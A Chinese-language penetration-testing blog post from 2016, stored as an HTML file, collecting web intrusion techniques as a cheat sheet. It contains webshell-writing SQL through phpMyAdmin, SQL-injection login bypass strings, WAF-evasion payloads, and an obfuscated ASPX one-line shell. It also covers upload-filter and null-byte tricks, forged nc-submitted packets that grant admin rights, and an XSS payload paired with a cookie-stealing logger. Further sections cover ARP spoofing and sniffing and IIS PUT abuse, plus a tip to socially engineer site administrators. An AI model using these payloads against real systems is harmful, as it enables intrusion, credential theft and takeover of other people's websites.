@@ -1,0 +1,313 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>渗透学习第一阶段总结[2] | xiaofeng&#39;s Blog</title>
+  <meta name="author" content="xiaofeng">
+  
+  <meta name="description" content="0x00 linux解析格式：1.php.xxx (xxx可以是任意)如果apache不认识后缀为rar的文件，我们就用1.php.rar格式上传，文件就会被服务器当做PHP脚本解析。辨别linux系统方法，例如：http://www.xxx.com/xxx/abc.asp?id=125 把b换成大">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="渗透学习第一阶段总结[2]"/>
+  <meta property="og:site_name" content="xiaofeng&#39;s Blog"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/favicon.png" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="xiaofeng&#39;s Blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+<a href="https://github.com/xiaofengtongxue/xiaofengtongxue.github.io.git" target="_blank">
+<img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_white_ffffff.png" alt="Fork me on GitHub">
+</a>
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">xiaofeng&#39;s Blog</a></h1>
+  <h2><a href="/">一个不抽烟 不喝酒的少年</a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+      <li><a href="//about">About</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-07-02T12:20:40.000Z"><a href="/2016/07/02/15/">2016-07-02</a></time>
+      
+      
+  
+    <h1 class="title">渗透学习第一阶段总结[2]</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h2 id="0x00-linux"><a href="#0x00-linux" class="headerlink" title="0x00 linux"></a>0x00 linux</h2><p>解析格式：1.php.xxx (xxx可以是任意)<br>如果apache不认识后缀为rar的文件，我们就用1.php.rar格式上传，文件就会被服务器当做PHP脚本解析。<br>辨别linux系统方法，例如：<a href="http://www.xxx.com/xxx/abc.asp?id=125" target="_blank" rel="external">http://www.xxx.com/xxx/abc.asp?id=125</a> 把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统</p>
+<h2 id="0x01-旁注"><a href="#0x01-旁注" class="headerlink" title="0x01 旁注"></a>0x01 旁注</h2><p>旁注的技巧就是挑选支持aspx的站来日，这样提权时候希望较大，如何探测服务器上哪些站点支持aspx呢? 利用bing搜索：<a href="http://cn.bing.com/" target="_blank" rel="external">http://cn.bing.com/</a> 搜索格式：ip:服务器ip aspx<br>比如要入侵一个网站，想知道该网站支不支持aspx，就在网站后面随便加上一个xxx.aspx回车，如果显示的不是iis默认的错误页面，而是这种：“/”应用程序中的服务器错误，说明支持aspx马。</p>
+<h2 id="0x02-phpmyadmin"><a href="#0x02-phpmyadmin" class="headerlink" title="0x02 phpmyadmin"></a>0x02 phpmyadmin</h2><p>查看版本：test.php 或 phpinfo.php<br>默认账号密码：root root<br>万能帐号密码：’localhost’@’@” 密码空<br>拿shell第一种方法：</p>
+<pre><code>CREATE TABLE `mysql`.`darkmoon` (`darkmoon1` TEXT NOT NULL );
+INSERT INTO `mysql`.`darkmoon` (`darkmoon1` ) VALUES (&apos;&lt;?php @eval($_POST[pass]);?&gt;&apos;);
+SELECT `darkmoon1` FROM `darkmoon` INTO OUTFILE &apos;d:/wamp/www/darkmoon.php&apos;;
+DROP TABLE IF EXISTS `darkmoon`;
+</code></pre><p>拿shell第二种方法：</p>
+<pre><code>Create TABLE moon (darkmoon text NOT NULL);
+Insert INTO moon (darkmoon) VALUES(&apos;&lt;?php @eval($_POST[pass]);?&gt;&apos;);
+select darkmoon from moon into outfile &apos;d:/wamp/www/darkmoon2.php&apos;;
+Drop TABLE IF EXISTS moon;
+</code></pre><p>拿shell第三种方法：</p>
+<pre><code>select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos;INTO OUTFILE &apos;d:/wamp/www/darkmoon3.php&apos;
+</code></pre><p>拿shell第四种方法</p>
+<pre><code>select &apos;&lt;?php echo \&apos;&lt;pre&gt;\&apos;;system($_GET[\&apos;cmd\&apos;]); echo \&apos;&lt;/pre&gt;\&apos;; ?&gt;&apos; INTO OUTFILE &apos;d:/wamp/www/darkmoon4.php&apos;
+</code></pre><p>127.0.0.1/darkmoon4.php?cmd=net user<br>找到mysql数据库，执行sql语句即可写入一句话，再菜刀连接即可。<br>phpmyadmin脱裤：在这里面是可以直接拖库的，如同上传php拖库脚本一样，操作差不多的。<br>修改mysql默认的root用户名方法:<br>进入phpmyadmin,进入mysql表,执行sql语句<br>         1.update user set user=’你的新root用户名’ where user=’root’;<br>         2.flush privileges;<br>例如：<br>用root身份登入，进入mysql库，修改user表即可。<br>         1.use mysql;<br>         2.mysql&gt;update user set user=’newName’ where user=’root’;<br>         3.mysql&gt; flush privileges;   </p>
+<h2 id="0x03-万能密码"><a href="#0x03-万能密码" class="headerlink" title="0x03 万能密码"></a>0x03 万能密码</h2><pre><code>&apos;xor
+&apos;or&apos;=&apos;or&apos;
+&apos;or&apos;&apos;=&apos;&apos;or&apos;&apos;=&apos;
+&apos;or &apos;1&apos;=&apos;1&apos;or &apos;1&apos;=&apos;1
+&apos;or 1=1/*
+&apos;or 1=1--
+</code></pre><h2 id="0x04-安全狗"><a href="#0x04-安全狗" class="headerlink" title="0x04 安全狗"></a>0x04 安全狗</h2><p>1.过注入<br>方法一：a.asp?aaa=%00&amp;id=sql语句<br>方法二： a.asp?id=sql语句   里面把安全过滤的加个%l 比如： un%aion sel%aect 1,2,3,4 fr%aom admin<br>2.过大马被阻拦访问<br>方法一：上传一个大马 然后访问<a href="http://sss.com/dama.asp" target="_blank" rel="external">http://sss.com/dama.asp</a>  访问后出现拦截。<br>那么解决方法 先将dama.asp改名dama.jpg上传，然后在同目录上传个文件da.asp 内容为： <!--#include file="dama.jpg" -->  这样再访问da.asp  就不会被拦截了。<br>3.过菜刀连接一句话被拦截<br>方法一：不用菜刀连接一句话，用别的一句话连接端。<br>方法二：中转下连接菜刀，把过滤掉的词替换掉。</p>
+<h2 id="0x05-asp搜索框注入"><a href="#0x05-asp搜索框注入" class="headerlink" title="0x05 asp搜索框注入"></a>0x05 asp搜索框注入</h2><p>在搜索框里，我们输入一个关键词，该关键词必须在这个站能搜索到信息。比如这个站我输入了1，搜索到了很多新闻，判断这个搜索框是否有注入漏动。<br>直接在前台的搜索框里注入被限制的话，可以本地构造表单进行注入：</p>
+<pre><code>&lt;html&gt;
+&lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;http://www.xxx.com/search.asp&quot;&gt;
+  类型：
+  &lt;label&gt;
+  &lt;input name=&quot;t&quot; type=&quot;text&quot; id=&quot;t&quot; value=&quot;1&quot;&gt;
+  &lt;/label&gt;
+  &lt;p&gt;
+      内容：
+      &lt;label&gt;
+      &lt;input name=&quot;key&quot; type=&quot;text&quot; id=&quot;key&quot;&gt;
+      &lt;/label&gt;
+  &lt;/p&gt;
+  &lt;p&gt;
+     &lt;label&gt;
+     &lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;提交&quot;&gt;
+     &lt;/label&gt;
+  &lt;/p&gt;
+&lt;/form&gt;
+</code></pre><p>1%’ ‘ and ‘%’=’         系统报错<br>1%’ and 1=1 and ‘%’=’   返回正确<br>1%’ and 1=2 and ‘%’=’   返回错误<br>1%’ and (select count(*) from 表段) and ‘%’=’   猜表段<br>1%’ and (select count(字段) from 表段) and ‘%’=’  猜字段<br>1%’ and (select top 1 len(字段) from 表段)&gt;16 and ‘%’=’  猜字段长度<br>1%’ and (select top 1 asc(mid(name,1,1)) from 表段)&gt;97 and ‘%’=’   猜内容<br>用牛族字符转换器转换数字。（猜长度的时候，选择对的前面那个错的数字！或是直接把大于号改为等于号，看看正确就是了）<br>有的网站存在搜索框，利用这个搜索框进行注射从而爆出管理帐号密码：%’ and 1=2 union select 1,admin,3,4,5,6,password,8,9,10 from admin where ‘%’=’<br>我们在搜索框里，搜索关键词1浏览器地址栏显示：<a href="http://www.XXXXXX.com/News_search.asp?key=1&amp;otype=msg" target="_blank" rel="external">http://www.XXXXXX.com/News_search.asp?key=1&amp;otype=msg</a><br>这里的key=1，就是说我们搜索得关键词1，我们要做的就是把key=1放到最后面，把连接变成：<a href="http://www.XXXXXX.com/News_search.asp?otype=msg&amp;key=1" target="_blank" rel="external">http://www.XXXXXX.com/News_search.asp?otype=msg&amp;key=1</a><br>或者直接把&amp;otype=msg删除，变成：<a href="http://www.XXXXXX.com/News_search.asp?key=1" target="_blank" rel="external">http://www.XXXXXX.com/News_search.asp?key=1</a></p>
+<h2 id="0x05-本地构造上传漏洞"><a href="#0x05-本地构造上传漏洞" class="headerlink" title="0x05 本地构造上传漏洞"></a>0x05 本地构造上传漏洞</h2><p>寻找程序上传漏洞，必须从上传页面的源文件入手，目标有两个：<br>1.filename (文件名称)  在上传页面中针对文件扩展名过滤不严，从而上传可执行的脚本木马。<br>2.filepath (文件路径)  在上传页面针对路径过滤不严，导致可以修改上传相对路径上传脚本木马。<br>当检测到一个上传页面，asp、asa后缀已经被过滤掉的时候，可以尝试抓包明小子或NC上传！<br>不行就利用本地上传漏洞构造上传！例如上传页面是：<a href="http://www.baidu.com/upfile_other.asp" target="_blank" rel="external">http://www.baidu.com/upfile_other.asp</a><br>1.右键查看源文件，找到这段代码：<form name="form1" method="past" action="zwhua_upload1.asp" enctype="multipart/form-data">把以上代码中actino处的路径补全！即：<form name="form1" method="past" action="http://www.xxx.com/zwhua_upload1.asp" enctype="multipart/form-data"><br>2.再找到这段代码：<input type="hidden" name="filepath" value="uploadfile/">利用IIS6.0解析漏洞，把以上代码中value处的文件补全！即：<input type="hidden" name="filepath" value="uploadfile/1.asa; ">  注意：冒号后面有空格！<br>3.接着保存为1.html，将刚保存的文件拖进去C32里，选择十六进制模式，找到“1.asa; ”后面的空格，将其填充为00后保存退出！<br>4.本地打开上传图片格式的木马(不成功时可以尝试上传一句话木马)，如果提示成功后不显示路径的话，可以右键查看源文件自己手工找出路径访问即可！</form></form></p>
+<h2 id="0x06-利用双文件上传拿shell"><a href="#0x06-利用双文件上传拿shell" class="headerlink" title="0x06 利用双文件上传拿shell"></a>0x06 利用双文件上传拿shell</h2><p>因为网站只判断一次，如果第一个文件后缀是在白名单里面的话，就让其上传，并没有判断第二个文件，所以上传任意格式的文件也让其通过。<br>当系统验证cookie的时候，就要用到火狐浏览器了，登录网站进后台，让火狐浏览器保存管理员的cookie值，再把修改后的“双文件上传工具”拖进去上传。<br>1.在后台找上传点，右键查看源文件，找到上传地址，一般在post或action的附近，搜索即可找到，一般为：src=”../xxx.htm”  之后补全路径访问。<br>2.这个还不是真正的上传页面，真正的上传页面后缀是asp的，继续查看源代码，找到action=”xxx.asp”，补全路径访问即可！<br>4.其实也可以抓包从而获得上传路径，抓包之后，在Referer:这栏，还有常见的是：htto://www.xxxx.com/upfile_other.asp<br>3.打开双文件上传工具，替换为当前的上传地址，保存后拖进火狐浏览器里，第一个选择jpg木马，第二个选择cer木马，提交后右键查看源文件找出路径即可。</p>
+<h2 id="0x07-数据库备份抓包改包NC提交拿shell"><a href="#0x07-数据库备份抓包改包NC提交拿shell" class="headerlink" title="0x07 数据库备份抓包改包NC提交拿shell"></a>0x07 数据库备份抓包改包NC提交拿shell</h2><p>当备份路径不能修改,后缀又是mdb不变的时候，我们可先对备份的过程进行抓包，再本地构造用NC提交即可突破备份，数据库恢复也可使用此方法！<br>在抓包的时候，最好用火狐浏览器，因为有的浏览器抓不到包，首先上传一张图片木马复制下地址，接着对备份过程进行抓包！把抓到的数据复制在文本里面！<br>开始本地修改，先把POST处补全网址，找到最底下的一行数据，再复制多一行对比长度进行修改，把备份的数据名称替换为木马地址，备份的名称改为自己想要的asp后缀！<br>再将原来的数据长度跟现在的对比同时替换掉，最后看一共增加了多少个字符，就在Content-Length:处进行增减，用NC提交数据格式：nc 域名 80&lt;1.txt</p>
+<h2 id="0x08-本地构造数据库备份突破拿shell"><a href="#0x08-本地构造数据库备份突破拿shell" class="headerlink" title="0x08 本地构造数据库备份突破拿shell"></a>0x08 本地构造数据库备份突破拿shell</h2><p>当上传jpg木马得到路径前去备份时，发现数据库备功能用不了的情况下，可以尝试本地构造突破拿shell！<br>首先查看源文件，找到“当前数据库路径”修改为刚上传jpg木马的路径，再找到“数据库备份名称”修改为1.asa<br>找到“<form method="past" action="Backup.asp?action=Backup">” 将路径补全“<form method="past" action="http://xxx.com/admin/Backup.asp?action=Backup">”<br>最后保存为1.html，有的网站不验证cookie的话，直接打开进行备份就能成功了，但是一般都需要验证cookie，这时就用上火狐浏览器了。<br>因为火狐浏览器有保留cookie的功能，先登录后台，以管理员的权限进行上传，直接把1.html拖进火狐浏览器里，直接点击备份即可突破cookie验证！</form></form></p>
+<h2 id="0x09-本地构造限制上传类型漏洞"><a href="#0x09-本地构造限制上传类型漏洞" class="headerlink" title="0x09 本地构造限制上传类型漏洞"></a>0x09 本地构造限制上传类型漏洞</h2><p>一般用于直接扫到的上传页面，名称是：上传图片，上传asp、asa等脚本时提示“请选择jpg或gif文件!”<br>这时通过这个方法一般都能成功，首先保存到本地1.asp  放到小旋风的目录下，然后找到以下这段代码：</p>
+<pre><code>alert(&quot;请点击浏览按钮，选择您要上传的jpg或gif文件!&quot;)
+myform.file1.focus;
+return (false);
+}
+else
+{
+str= myform.file1.value;
+strs=str.toLowerCase();
+lens=strs.length;
+extname=strs.substring(lens-4,lens);
+if(extname!=&quot;.jpg&quot; &amp;&amp; extname!=&quot;.gif&quot;)
+{
+alert(&quot;请选择jpg或gif文件!&quot;);
+</code></pre><p>看到这句代码：if(extname!=”.jpg” &amp;&amp; extname!=”.gif”)  改为：    if(extname!=”.jpg” &amp;&amp; extname!=”.gif” &amp;&amp; extname!=”.asp”)<br>然后补充完整上传地址，action=这里，然后网页打开127.0.0.1 直接上传asp文件就可以了。</p>
+<h2 id="0x09-抓包改包NC提交拿shell"><a href="#0x09-抓包改包NC提交拿shell" class="headerlink" title="0x09 抓包改包NC提交拿shell"></a>0x09 抓包改包NC提交拿shell</h2><p>1.抓包数据中如果存在name=”filepath”或是name=”filename”，那么就可以满足NC的上传条件了。<br>2.将木马的抓包数据复制到文本文件中。例如：1.txt<br>3.将路径补全：<br>filepath截断法：<br>uploadfile/路径后添加1.asp空格 (16进制下面将20改为00)<br>filename自定义名称：<br>C:\Documents and Settings\lei\桌面\1.jpg (将1.jpg 改为 1.asp空格，16进制下将20改为00)<br>3.在Content-Length处加上../uploadfile/后增加的字节数。<br>4.用C32将空格的20改为00，保存为1.txt。<br>5.把1.txt跟nc.exe放在同一目录下，cmd命令：nc -vv www.XXXX.com 80&lt;1.txt<br>( 如果上传成功后没有将木马解析成asp，可以尝试将文件名改成asa、cer、php 再不行就用IIS 6.0解析漏洞，将文件名改为1.asa;1.jpg )</p>
+<h2 id="0x0A-抓包nc上传获取管理权限"><a href="#0x0A-抓包nc上传获取管理权限" class="headerlink" title="0x0A 抓包nc上传获取管理权限"></a>0x0A 抓包nc上传获取管理权限</h2><p>这个方法相当于cookie欺骗，首先到前台去注册一个会员，注册成功后在登录的那一刻，用抓包工具进行抓包，把抓到的数据复制到1.txt里面。<br>接下来打开，把双引号里棉的数据“X-Forwarded-For: 127.0.0.2’,group_id = 1 where loginname = ‘会员的帐号’#” 放在Content-Length：的下面。<br>在看到最底下的loginname=这行代码，把最后面的验证码改成当前会员登陆的验证码，然后将nc\1.txt 放在同一个目录下，cmd命令：nc 域名 80&lt;1.txt<br>成功提交上去后，刚才的会员帐户将变成管理员帐户了，找到该站的后台地址登录即可实现cookie欺骗！</p>
+<h2 id="0x0B-cookie欺骗"><a href="#0x0B-cookie欺骗" class="headerlink" title="0x0B cookie欺骗"></a>0x0B cookie欺骗</h2><p>当我们通过注入或是社工把管理员的帐号跟md5密码搞到手的时候，却发现破解不出密码 (MD5是16位加密的)<br>那么我们就可以用COOKIE欺骗来绕过，利用桂林老兵的cookie欺骗工具，把自己的ID以及md5密码都修改成管理员的，再修改cookie，访问时就会实现欺骗了。</p>
+<h2 id="0x0C-cookie中转突破防注入"><a href="#0x0C-cookie中转突破防注入" class="headerlink" title="0x0C cookie中转突破防注入"></a>0x0C cookie中转突破防注入</h2><p>有时检测一个网站，系统会弹出一些SQL防注入的提示框，这时我们可以利用COOKIE中转注入来进行突破，首先准备一个webshell，然后打开COOKIE中转工具。<br>复制注入点到“注入URL地址跟来源页”处，把问号去掉，再把问号后面的ID=剪切到“注入键名”里，再把ID=后面那个参数剪切到“POST提交值”里替换jmdcw=后面的参数。<br>点击生成，再把生成的文件上传到webshell里，然后访问路径，再页面地址后面加“?jmdcw=参数”，这样搭建构造出来的注入点就绕过防注入了！<br>以上是在webshell里搭建ASP坏境的方法，下面的是本地架设ASP环境的方法：<br>利用简易IIS服务器搭建一个环境，再将COOKIE中转生成的文件放到简易IIS服务器的目录下！然后运行简易IIS服务器，在后面+文件名+问号+jmdcw=参数即可。</p>
+<h2 id="0x0D-cookie手工突破防注入"><a href="#0x0D-cookie手工突破防注入" class="headerlink" title="0x0D cookie手工突破防注入"></a>0x0D cookie手工突破防注入</h2><p>第一种方法：<br>用 and 1=1 and 1=2 检测网站是否存在注入点时，如果提示你的IP已被记录，就说明系统做了防注入措施，可以用代码来突破。<br>管理员只过滤了and，但是没有过滤or，我们可以先猜网站的字段数 格式：order by 数字  猜到错为止，然后选前一个对的数字！<br>比如猜到14错误，那就是13了，然后利用Cookie提交变量值，代码：javascript:alert(document.cookie=id=”+escape(“这里填写变量值，例如：id=408”));<br>开始猜解表段，代码：javascript:alert(document.cookie=”id=”+escape(“变量值 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13 from admin”));<br>复制在浏览器里打开，将出现一个提示框，点击确定就会注射进去，再重新打开网站（要在此处打开，所以前面最好复制下网站地址）<br>然后就会出现两个提示数字，比如5跟6，然后在代码的5跟6处猜帐号密码，常见的帐号有：user  username  密码:pass  password<br>复制修改后的代码放到浏览器里打开，就会爆破出网站的帐号密码了<br>第二种方法：<br>注入点：<a href="http://www.XXXXXXXX.gov.cn/shownews.asp?id=4098" target="_blank" rel="external">http://www.XXXXXXXX.gov.cn/shownews.asp?id=4098</a><br>首先把?id=408去掉，然后访问如果提示“数据库出错”！就说明网站没有过滤Cookie提交方式，可以利用Cookie欺骗绕过防注入！<br>利用Cookie提交变量值，代码：javascript:alert(document.cookie=”id=”+escape(“4098”)<br>下面开始在Cookie注入中执行常规注入攻击，提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and 1=1”));<br>访问<a href="http://www.XXXXXXXX.gov.cn/shownews.asp" target="_blank" rel="external">http://www.XXXXXXXX.gov.cn/shownews.asp</a> 显示正常页面，<br>再提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and 1=2”));  显示错误页面！<br>下面来开始猜解表段，提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and exists (select * from 表段)”))；<br>接着猜字段，提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and exists (select 字段 from admin)”))；  例如：username<br>接着猜字段，提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and exists (select 字段 from admin)”)),   例如：password<br>下面开始猜字段数跟字段内容了，提交代码:javascript:alert(document.cookie=”id=”+escape(“4098 and 1=2 union select 1,2,3,4,5,6 from 表段”));<br>一直猜解到对为止，这里只是猜到6，记得继续加减！猜解到对的时候，页面会出现数字，然后在相对应的数字替换字段名，再进行提交代码！<br>这时如果字段名猜对的话，就会爆出帐号密码了，不对的话继续替换字段名，位置不变！（存在cookie注入时建议参考mysql手工注入的语句）</p>
+<h2 id="0x0E-伪静态注入"><a href="#0x0E-伪静态注入" class="headerlink" title="0x0E 伪静态注入"></a>0x0E 伪静态注入</h2><p>伪静态网站注入方法，莱鸟扫盲来了哦，通常情况下，动态脚本的网站的url类似下面这样：<br><a href="http://www.91ri.org/news.php?id=111" target="_blank" rel="external">http://www.91ri.org/news.php?id=111</a><br>做了伪静态之后就成这样了：<br><a href="http://www.91ri.org/news.php/id/111.html" target="_blank" rel="external">http://www.91ri.org/news.php/id/111.html</a><br>以斜杠“/”代替了“=”并在最后加上.html，这样一来，就无法直接用工具来注入了。<br>常规的伪静态页面如下：<a href="http://www.XXX.com/play/Diablo.htm" target="_blank" rel="external">http://www.XXX.com/play/Diablo.htm</a><br>例如关联的动态页面是game.php ，那么当用户访问后程序会自动转换成类似<a href="http://www.XXX.com/game.php?action=play&amp;name=Diablo" target="_blank" rel="external">http://www.XXX.com/game.php?action=play&amp;name=Diablo</a> 的形式<br>注入点检测可以用：<a href="http://www.XXX.com/play/Diablo" target="_blank" rel="external">http://www.XXX.com/play/Diablo</a>‘ and 1=’1.html与<a href="http://www.XXX.com/play/Diablo" target="_blank" rel="external">http://www.XXX.com/play/Diablo</a>‘ and 1=’2.html来判断<br>通常情况下，动态脚本的网站的url类似下面这样：<a href="http://www.xxoo.net/aa.php?id=123" target="_blank" rel="external">http://www.xxoo.net/aa.php?id=123</a><br>做了伪静态之后类似这样：<a href="http://www.xxoo.net/aa.php/id/123.html" target="_blank" rel="external">http://www.xxoo.net/aa.php/id/123.html</a> 以斜杠“/”代替了“=”并在最后加上.html，这样一来，就无法直接用工具来注入了！</p>
+<h2 id="0x0F-嗅探"><a href="#0x0F-嗅探" class="headerlink" title="0x0F 嗅探"></a>0x0F 嗅探</h2><p>当入侵一个网站，该网站没有任何漏洞的情况下，可以进行旁注，再提权拿下任意一台服务器，不行的话就C段，提权拿下任意一台服务器。<br>只要能拿下同网段的任意一台服务器，就可以使用C段嗅探来获取主站的帐号密码，cain是一款强大的劫持工具。<br>在服务器里安装cain后打开主控端，点击配置-&gt;选择服务器IP一项-&gt;在路由追踪一项取消全部-&gt;确定。<br>设置完毕后点击一下激动按钮(中间那个)，再点击嗅探器，点击加号符号，选择所有在子网主机，选择ARP测试(传播 31-位)，确定。<br>扫描完毕选择网关一项，点击ARP，点击加号符号，左边选择网关，右边选择全部的C段，确定，点击开始嗅探按钮(第三个)，嗅探到的帐号密码在口令一项展现！<br>如果发现没数据可以使用幻境网盾来限制网速，让cain的发包快过防火墙。</p>
+<h2 id="0x10-arp欺骗"><a href="#0x10-arp欺骗" class="headerlink" title="0x10 arp欺骗"></a>0x10 arp欺骗</h2><p>只要该服务器存在C段，都可以尝试arp欺骗，用到的工具是NetFuke，想知道arp劫持能不能成功，cmd命令：arp -a  看一下，动态的服务器IP就能成功，静态的就不能。<br>安装完运行主控端，设置–嗅探设置–网卡选择服务器的IP–控制选项选择“启用ARP欺骗、启用过滤器、启用分析器、启用修改器、主动转发” 确定。<br>设置–ARP欺骗–双向欺骗–来源Ip填服务器的网关–中间人IP填服务器的IP–目标IP填要欺骗的任意C段ip(用御剑扫描C段)–确定。<br>插件管理–修改器–最后一个选项双击–在右边的HTML Body = [haha!!] 填写自己要展现的文字，点击开始即可欺骗成功！</p>
+<h2 id="0x11-突破安全狗防注入及上传"><a href="#0x11-突破安全狗防注入及上传" class="headerlink" title="0x11 突破安全狗防注入及上传"></a>0x11 突破安全狗防注入及上传</h2><p>写入webshell 写不进去，平常的一句话 也失效，用这段代码：</p>
+<pre><code>&lt;%@ Page Language=&quot;C#&quot; ValidateRequest=&quot;false&quot; %&gt; &lt;%try{System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[&quot;admin163.net&quot;].Value))).CreateInstance(&quot;c&quot;, true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null,null); } catch { }%&gt;
+</code></pre><p>连接端用cncert的aspx一句话客户端<br>2、IIS6.0解析漏洞遇到安全狗<br>文件名为<a href="http://www.baicai.com/1.asp;1.jpg" target="_blank" rel="external">http://www.baicai.com/1.asp;1.jpg</a><br>这样的会被IIS安全狗果断屏蔽<br>改成如下名称,IIS6一样会解析:www.baicai.com/;1.asp;1.jpg<br>3、安全狗的注入绕过<br>常用的如baicai.asp?id=1 and 1=1 是会被安全狗屏蔽的。<br>但这样就可以突破了：baicai.asp?0day5.com=%00.&amp;id=69%20 and 1=1</p>
+<h2 id="0x12-跨站xss"><a href="#0x12-跨站xss" class="headerlink" title="0x12 跨站xss"></a>0x12 跨站xss</h2><p>在网站留言或者能输入信息的地方提交跨站代码，从而盗取管理员cookie，然后用cookie浏览器直接进入后台，将以下代码保存为asp文件，例如1.asp</p>
+<pre><code>&lt;%
+thisfile=Server.MapPath(&quot;cookie.txt&quot;)
+msg=Request(&quot;msg&quot;)
+set fs=server.CreateObject(&quot;scripting.filesystemobject&quot;)
+set thisfile=fs.OpenTextFile(thisfile,8,True,0)
+thisfile.WriteLine(&quot;=======cookie:&quot;&amp;msg&amp;&quot;======by:剑眉大侠&quot;)
+thisfile.close
+set fs=nothing
+%&gt;
+</code></pre><p>首先搭建一个asp环境，推荐使用“ASP服务器（摆脱安装IIS）” 再将1.asp放在wwwroot目录下，访问1.asp文件如果提示下载，则说明搭建成功了。<br>然后在留言板的“您的网站”一处输入：<script>doucument.location=’<a href="http://127.0.0.1/1.asp?msg=&#39;document.cookie">http://127.0.0.1/1.asp?msg=&#39;document.cookie</a></script><br>当管理员浏览我们提交的留言时，将在wwwroot目录下生成一个cookie.txt文件，这时我们只要访问cookie.txt这个文件，就能知道管理员的cookie是多少了！<br>然后再使用桂林老兵的cookie欺骗工具或是网页源代码查看分析器，访问网站再输入cookie进行欺骗登录即可！（填cookei的时候记得选择自定义）<br>小技巧：要想让管理员早点浏览你提交的留言，可以通过打电话，QQ客服等去社工他即可。</p>
+<h2 id="0x13-爆库"><a href="#0x13-爆库" class="headerlink" title="0x13 爆库"></a>0x13 爆库</h2><p>%5C为十六进制的\符号，而数据库大于5.0就可以爆库，若一个网站数据库大于5.0，且是ACESS数据库，若不能注入的注入点是：<a href="http://www.xxx.com/rpc/show24.asp?id=127" target="_blank" rel="external">http://www.xxx.com/rpc/show24.asp?id=127</a><br>我们直接把%5C加到rpc后面，因为%5C是爆二级目录，所以应该是这样，<a href="http://www.xxx.com/rpc%5c/show24.asp?id=127" target="_blank" rel="external">http://www.xxx.com/rpc%5c/show24.asp?id=127</a><br>而%23是代表#，如果管理员为了防止他人非法下载数据库，而把数据库改成#database.mdb,这样防止了。<br>如果页面地址为：<a href="http://www.xx.com/rpd/#database.mdb" target="_blank" rel="external">http://www.xx.com/rpd/#database.mdb</a>  把%23替换#就可以下载了，即：<a href="http://www.xx.com/rpd/%23database.mdb" target="_blank" rel="external">http://www.xx.com/rpd/%23database.mdb</a><br>还有利用默认的数据库路径 <a href="http://www.xxx.com/" target="_blank" rel="external">http://www.xxx.com/</a> 后面加上 conn.asp 如果没有修改默认的数据库路径，也可以得到数据库的路径（注意：这里的/也要换成%5c）<br>如果你能看到：’E:/ahttc040901/otherweb/dz/database/iXuEr_Studio.asa’不是一个有效的路径。 确定路径名称拼写是否正确，以及是否连接到文件存放的服务器。<br>这样的就是数据库了。下载时用FLASHGET换成.MDB格式的就行. </p>
+<h2 id="0x14-利用sql注入点判断网站和数据库是否站库分离"><a href="#0x14-利用sql注入点判断网站和数据库是否站库分离" class="headerlink" title="0x14 利用sql注入点判断网站和数据库是否站库分离"></a>0x14 利用sql注入点判断网站和数据库是否站库分离</h2><p>在注入点后加上：and exists(select * from admin where 1=(Select (case when host_name()=@@servername then 1 else 0 end)))<br>注意admin一定要是存在的表段，如果返回正常，说明网站和数据库是在同一服务器，如果不正常则说明是站库分离的。</p>
+<h2 id="0x15-iis6-0-PUT写入漏洞"><a href="#0x15-iis6-0-PUT写入漏洞" class="headerlink" title="0x15 iis6.0 PUT写入漏洞"></a>0x15 iis6.0 PUT写入漏洞</h2><p>利用工具：IIS PUT Scaner、桂林老兵IIS写权限利用程序<br>1、IIS来宾用户对网站文件夹有写入权限<br>2、web服务器扩展力设置webDAV为允许，即：WebDAV—打勾<br>3、网站主目录:写入—打勾(可PUT)<br>4、网站主目录:脚本资源访问—打勾（可COPY、MOVE）<br>大家都清楚，写权限就是允许PUT，与网站自身运行的权限无丝毫联系，如果开启了，就是没有一点安全意识，就给我们提供了大大的方便。<br>首先用御剑工具扫下C段，比如：12.12.12.1 - 12.12.12.255  打开IIS PUT Scaner，把12.12.12.1放在Start IP 这里，12.12.12.255放在End IP 这里，<br>接着在Port这里，换成80，点击Scan开始嗅探，当PUT这里显示是Yes就说明存在漏洞，可以右键选择PUT file，输入文件名1.txt，下面填内容，保存就可以写入了。<br>或是利用“桂林老兵IIS写权限利用程序”也可以，这款工具比较强大，把域名填写进去，例如：www.xxx.com，然后在请求文件那里输入你的文件名，<br>在数据包格式那里选择PUT，有的会直接弹出浏览文件框，没有就自己选择，在下面，然后点击提交数据库即可，一般是先PUT一个txt文件，再MOVE成asp木马。<br>直接提交asp木马的话，如果MOVE方法不行，可以试试Copy。</p>
